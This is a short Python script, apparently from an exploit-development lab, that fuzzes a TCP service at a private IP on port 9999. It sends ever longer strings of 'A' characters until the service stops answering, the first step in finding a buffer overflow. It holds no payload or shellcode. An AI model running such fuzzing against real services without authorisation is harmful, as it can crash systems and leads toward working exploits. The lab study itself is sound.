import socket, time, sys
#Connection to target
ip = "172.21.21.28"
port = 9999 
timeout = 5
#Create how the payload will be a a alot of A
buffer = []
counter = 100
while len(buffer) < 70:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        print("Fuzzing hello %s bytes") % len(string)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        #s.recv(1024)
        #Sending the "A" charactes to Hello
        s.send(string + "\r\n")
        s.recv(1024)
        #Waiting 1 second before continue
        #time.sleep(1)
        s.close()
    #When the application hangs/crash print out message
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
